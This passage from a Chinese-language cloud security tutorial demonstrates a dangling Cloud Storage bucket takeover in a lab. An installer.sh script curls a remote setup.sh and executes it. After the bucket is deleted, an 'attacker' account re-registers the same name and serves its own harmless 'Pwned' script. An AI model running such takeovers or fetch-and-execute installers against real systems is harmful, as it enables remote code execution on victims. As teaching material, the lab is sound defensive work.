

本节假设您使用的是 Serverless Lab 账户，该账户托管了易受攻击的按设计构建的无服务器实验环境。

现在，让我们创建存储桶以及引用它的关联脚本：

1. 运行以下命令生成唯一的存储桶名称并将其存储在环境变量（`BUCKET_NAME`）中：
```
RAND=$RANDOM
RANDOM_IDENTIFIER="$RAND"
BUCKET_NAME="lss-installers-$RANDOM_IDENTIFIER"

echo $BUCKET_NAME
```
请务必记下存储在 `BUCKET_NAME` 中的值，因为您将在本章后续步骤中需要它。

2. 使用指定的名称设置一个可公开访问的 Cloud Storage 存储桶：
```
gsutil mb gs://$BUCKET_NAME
gsutil iam ch allUsers:objectViewer gs://$BUCKET_NAME
```

3. 检查存储桶的 IAM 配置以查看谁可以访问它：
```
gsutil iam get gs://$BUCKET_NAME
```
这会产生以下 JSON 输出：
```
{
  "bindings": [
    {
      "members": [
        "projectEditor:...",
        "projectOwner:..."
      ],
      "role": "roles/storage.legacyBucketOwner"
    },
    {
      "members": [
        "projectViewer:..."
      ],
      "role": "roles/storage.legacyBucketReader"
    },
    {
      "members": [
        "allUsers"
      ],
      "role": "roles/storage.objectViewer"
    }
  ],
  "etag": "..."
}
```

4. 向您的 Cloud Storage 存储桶上传一个占位符 shell 脚本：
```
echo "echo Hello" > setup.sh
gsutil cp setup.sh gs://$BUCKET_NAME
```
此基本 shell 脚本（`setup.sh`）在执行时仅打印 `Hello`。^([6](#ch08.html#id774))

5. 创建一个新文件（`installer.sh`），它将作为本地安装程序，用于从您的 Cloud Storage 存储桶下载并执行脚本：
```
cd ~
touch installer.sh
```

6. 在 Cloud Shell 编辑器中打开 `installer.sh` 文件并添加以下内容：^([7](#ch08.html#id775))
```
#!/usr/bin/env bash
set -euo pipefail

URL="https://storage.googleapis.com/lss-installers-[UNIQUE STRING]/setup.sh"
TMP_SCRIPT="/tmp/setup.sh"

echo "[*] Downloading installer from $URL..."
[ -f /tmp/setup.sh ] && rm /tmp/setup.sh
curl -fsSL "$URL" -o "$TMP_SCRIPT"

echo "[*] Making script executable..."
chmod +x "$TMP_SCRIPT"

echo "[*] Running installer..."
"$TMP_SCRIPT"

echo "[*] Done."
```
请确保将 `[UNIQUE STRING]` 替换为您唯一的存储桶标识符（存储在 `RANDOM_IDENTIFIER` 中）。您可以通过导航到 Google Cloud 控制台中的 Cloud Storage 存储桶页面并从列表中复制确切的存储桶名称来检索存储桶名称（`lss-installers-…​`）。

### Tip
`installer.sh` 文件的副本可在 [GitHub gist（查看 `installer.sh`）](https://oreil.ly/0mSPU) 中获得。

7. 在终端中运行以下命令（在 `$` 符号之后）以使安装程序脚本可执行：
```
chmod +x installer.sh
```

### Note
如果您尚未打开终端窗格，可以从编辑器菜单中打开（View → Terminal）。或者，您也可以点击 Cloud Shell 编辑器右上角的 Open Terminal。

8. 运行安装程序脚本：
```
./installer.sh
```
这应成功从 Cloud Storage 存储桶下载 `setup.sh` 文件，执行下载的脚本，并产生以下输出：
```
[*] Downloading installer from https://storage.googleapis.com/.../setup.sh...
[*] Making script executable...
[*] Running installer...
Hello
[*] Done.
```
这里，由于 `setup.sh` 脚本仅打印 `Hello`，运行 `installer.sh` 后您应在日志输出中看到此内容。

9. 删除存储桶以及存储桶内的 `setup.sh` 文件：
```
BUCKET_NAME="[SPECIFY BUCKET NAME]"
gsutil rm -r gs://$BUCKET_NAME
```
请务必指定存储桶名称并在运行命令前替换 `[SPECIFY BUCKET NAME]`。

此时，您有一个脚本（`installer.sh`）引用了一个不再存在的存储桶，从而为潜在的悬空存储桶接管打开了大门。借助此残留引用，攻击者可以注册相同的存储桶名称并上传恶意文件。因此，任何仍从旧引用下载的系统或用户都可能无意中获取并运行这些文件。

## 执行存储桶接管

现在悬空存储桶接管的条件已经建立，让我们检查一个潜在的攻击场景。在本节中，您将模拟攻击者在其账户中重新创建已删除的存储桶名称，使其可公开读取，并上传恶意的 `setup.sh` 文件。然后您将在 Serverless Lab 账户中运行原始的 `installer.sh`，使其下载并执行攻击者控制的脚本，以展示悬空存储桶如何被滥用。

### Note
在本节中您将同时使用 Serverless Lab 和 Attacker 账户。请确保在单独的浏览器窗口中打开它们。

让我们逐步了解攻击者可能采取的悬空存储桶接管步骤：

1. 在 Attacker 账户中，在 Cloud Shell 终端中运行以下命令以生成新的存储桶（使用与您在之前步骤中刚删除的存储桶相同的存储桶名称）并为其配置公共读取访问权限：
```
BUCKET_NAME="[SPECIFY BUCKET NAME]"
gsutil mb gs://$BUCKET_NAME
gsutil iam ch allUsers:objectViewer gs://$BUCKET_NAME
```
请确保在运行命令前将 `[SPECIFY BUCKET NAME]` 替换为您刚删除的存储桶的名称。^([8](#ch08.html#id777))

验证存储桶是否具有适当的权限，以便安装程序脚本可以成功从存储桶下载任何额外文件（例如 `setup.sh` 文件）：
```
gsutil iam get gs://$BUCKET_NAME
```
这应给您以下输出：
```
{
  "bindings": [
    {
      "members": [
        "projectEditor:...",
        "projectOwner:..."
      ],
      "role": "roles/storage.legacyBucketOwner"
    },
    {
      "members": [
        "projectViewer:..."
      ],
      "role": "roles/storage.legacyBucketReader"
    },
    {
      "members": [
        "allUsers"
      ],
      "role": "roles/storage.objectViewer"
    }
  ],
  "etag": "..."
}
```
向 Attacker 账户的 Cloud Storage 存储桶上传一个占位符 shell 脚本：
```
echo "echo Pwned" > setup.sh
gsutil cp setup.sh gs://$BUCKET_NAME
```

### Note
在实践中，攻击者可能会上传一个与原始版本非常相似的脚本，但包含细微的修改，在保持原始脚本主要功能正常工作的同时执行恶意操作。^([9](#ch08.html#id778))

2. 切换到已登录 Serverless Lab 账户的浏览器窗口。

3. 在您的 Serverless Lab 账户中，打开 Cloud Shell 终端并导航到 `installer.sh` 文件所在的目录。通过使用以下命令运行安装程序脚本：
```
./installer.sh
```
这会产生以下日志输出：
```
[*] Downloading installer from https://.../setup.sh...
[*] Making script executable...
[*] Running installer...
Pwned
[*] Done.
```

### Note
由于 Serverless Lab 账户中的原始存储桶已被删除，`installer.sh` 脚本下载并执行了来自 Attacker 账户 Cloud Storage 存储桶的恶意 `setup.sh` 脚本。

